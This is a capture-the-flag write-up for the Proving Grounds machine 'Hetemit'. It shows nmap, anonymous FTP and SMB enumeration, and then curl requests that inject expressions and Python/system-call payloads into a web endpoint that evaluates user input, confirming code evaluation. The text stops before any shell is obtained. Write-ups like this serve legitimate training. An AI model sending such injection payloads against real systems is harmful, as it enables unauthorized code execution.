### Hetemit Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.153.117

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]                                                                                                                                                
└─$ nmap -sCV -A 192.168.153.117 -p21,22,139,445,18000 -oN nmapscan                                                                                                                           
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 01:48 WAT                                                                                                                               
Nmap scan report for 192.168.153.117                                                                                                                                                          
Host is up (0.24s latency).                                                                                                                                                                   
                                                                                                                                                                                              
PORT      STATE SERVICE     VERSION                                                                                                                                                           
21/tcp    open  ftp         vsftpd 3.0.3                                                                                                                                                      
| ftp-syst:                                                                                                                                                                                   
|   STAT:                                                                                                                                                                                     
| FTP server status:                                                                                                                                                                          
|      Connected to 192.168.45.5                                                                                                                                                              
|      Logged in as ftp                                                                                                                                                                       
|      TYPE: ASCII                                                                                                                                                                            
|      No session bandwidth limit                                                                                                                                                             
|      Session timeout in seconds is 300                                                                                                                                                      
|      Control connection is plain text                                                                                                                                                       
|      Data connections will be plain text                                                                                                                                                    
|      At session startup, client count was 2                                                                                                                                                 
|      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                                                    
|_End of status                                                                                                                                                                               
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                        
|_Can't get directory listing: TIMEOUT                                                                                                                                                        
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)                                                                                                                                        
| ssh-hostkey:                                                                                                                                                                                
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)                                                                                                                                
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)                                                                                                                               
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)                                                                                                                             
139/tcp   open  netbios-ssn Samba smbd 4.6.2                                                                                                                                                  
445/tcp   open  netbios-ssn Samba smbd 4.6.2                                                                                                                                                  
18000/tcp open  biimenu?                                                                                                                                                                      
| fingerprint-strings:                                                                                                                                                                        
|   GenericLines:                                                                                                                                                                             
|     HTTP/1.1 400 Bad Request                                                                                                                                                                
|   GetRequest, HTTPOptions:                                                                                                                                                                  
|     HTTP/1.0 403 Forbidden                                                                                                                                                                  
|     Content-Type: text/html; charset=UTF-8                                                                                                                                                  
|     Content-Length: 3102                                                                                                                                                                    
|     <!DOCTYPE html>                                                                                                                                                                         
|     <html lang="en">                                                                                                                                                                        
|     <head>                                                                                                                                                                                  
|     <meta charset="utf-8" />                                                                                                                                                                
|     <title>Action Controller: Exception caught</title>                                                                                                                                      
|     <style>                                                                                                                                                                                 
|     body {                                                                                                                                                                                  
|     background-color: #FAFAFA;                                                                                                                                                              
|     color: #333;          
|     <style>                                                                                                                                                                                 
|     body {                                                                                                                                                                                  
|     background-color: #FAFAFA;                                                                                                                                                              
|     color: #333;                                                                                                                                                                            
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

Checking ftp it refuses to list files
```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ ftp 192.168.153.117
Connected to 192.168.153.117.
220 (vsFTPd 3.0.3)
Name (192.168.153.117:mark): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||7296|)
```

Even trying to get all files using wget it justs hangs 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ wget ftp://anonymous:anonymous@192.168.153.117/ -r         
--2023-01-26 01:54:01--  ftp://anonymous:*password*@192.168.153.117/
           => _192.168.153.117/.listing_
Connecting to 192.168.153.117:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... 
```

Lets move on

Checking smb we see we can list shares anonymously
```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ smbclient -L 192.168.153.117
Password for [WORKGROUP\mark]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Cmeeks          Disk      cmeeks Files
        IPC$            IPC       IPC Service (Samba 4.11.2)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

But we can't list files in the user's shares
                                                        
```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ smbclient //192.168.153.117/Cmeeks
Password for [WORKGROUP\mark]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```

Moving on to the web servers
![image](https://user-images.githubusercontent.com/113513376/214730763-1a733e48-240f-4553-8679-02fd31817285.png)

Lets try creating an account

But its a deadend 
![image](https://user-images.githubusercontent.com/113513376/214730896-7b934d27-65dd-40f0-b7d2-96a1effeefec.png)

Hmm lets check out the other web server which runs in port 50000

On navigating there we see it has two routes `/generate` & `/verify`
![image](https://user-images.githubusercontent.com/113513376/214731072-792a6b0b-e355-44a3-baef-1b61212ef7db.png)

Naviagting on to /generate shows that it requires an email
![image](https://user-images.githubusercontent.com/113513376/214731185-4b33c4af-f898-4d64-a30f-427405fa4896.png)

So lets use curl to send data and see what output it results in

```
                                                                                                                                                                                              
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/generate -X POST -d "email=lol@hacker.com"              
16978542bb9b4fe550076569bcdaad1d73aad9c44ce39ed6904861039d81a9bf                                                                                                                                                                                              
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/generate -X POST -d "email=haha@hacker.com"
5ba5e8553829ece373270af14adc76af939ea0ea74f87f0fc67c16c1b22c035d  
```

Hmmm it does some hardcore creation of the email given 

Lets test the other route which is /verify 
![image](https://user-images.githubusercontent.com/113513376/214731478-42ebc74b-ddd4-40e4-8da6-ec3e13c9dd71.png)

It requires a code I'll use curl again to send the data

```
                                                                                                                                                                                              
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/verify -X POST -d "code=1"                 
1                                                                                                                                                                                              
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/verify -X POST -d "code=2"
2               
```

We see it justs echo it back thats weird 

Lets try performing basic arithmetic maybe it will be evaluated

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/verify -X POST -d "code=2*2"
4                                                                                                                                                                                              
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/verify -X POST -d "code=4*4"
16              
```

Ah sweet it evaluated the value

I don't know what programming language uses. I used wappalyzer to get it but it isn't 100% sure of it lol
![image](https://user-images.githubusercontent.com/113513376/214732338-cfd8d46c-aefb-4f0d-8c6d-c907ea248857.png)

So i just tried injecting ruby command execution maybe it will execute but it doesn't meaning that the programming language the web uses isn't ruby

```
──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/verify -X POST -d "code=system%28%22ls%22%29"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
                                                                                                                                                                                              
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/verify -X POST -d "code=system('ls')"        
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Lets try getting the server info to know the programming language being used

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
└─$ curl http://192.168.153.117:50000/verify -X POST -d "code=print(4*4)" -v   
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.153.117:50000...
* Connected to 192.168.153.117 (192.168.153.117) port 50000 (#0)
> POST /verify HTTP/1.1
> Host: 192.168.153.117:50000
> User-Agent: curl/7.86.0
> Accept: */*
> Content-Length: 15
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 4
< Server: Werkzeug/1.0.1 Python/3.6.8
< Date: Thu, 26 Jan 2023 01:13:05 GMT
< 
* Closing connection 0
None 
```

Ok cool we know it's python 

So im going to try importing modules then run system command

